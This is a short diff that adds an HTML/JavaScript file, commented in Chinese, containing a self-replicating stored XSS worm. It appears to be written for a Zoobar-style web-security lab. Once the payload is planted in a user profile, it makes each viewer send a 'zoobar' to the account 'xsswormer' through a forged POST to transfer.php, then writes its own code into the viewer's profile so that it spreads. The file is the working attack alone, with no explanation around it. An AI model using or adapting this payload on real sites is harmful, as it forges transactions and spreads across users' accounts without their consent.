@@ -1,0 +1,22 @@
+<!--xss 蠕虫，将其存入user profile中生效-->
+
+<span id="xssworm-span">
+    <script>
+        xmlhttp=new XMLHttpRequest();
+        xmlhttp.open("POST","https://niss.com/transfer.php",false);
+        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        // 提交请求，为 xsswormer 转一个zoobar
+        xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");
+        xmlhttp=new XMLHttpRequest();
+
+        xmlhttp.open("POST","https://niss.com/index.php",true);
+        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        // 读取本文件 ==> str
+        str = "<span id=xssworm-span>"
+        str += document.getElementById("xssworm-span").innerHTML + "</span>";
+        str = encodeURIComponent(str);
+        // 将其保存至 profile中
+        str = "profile_submit=Save&profile_update=" + str;
+        xmlhttp.send(str);
+    </script>
+</span>
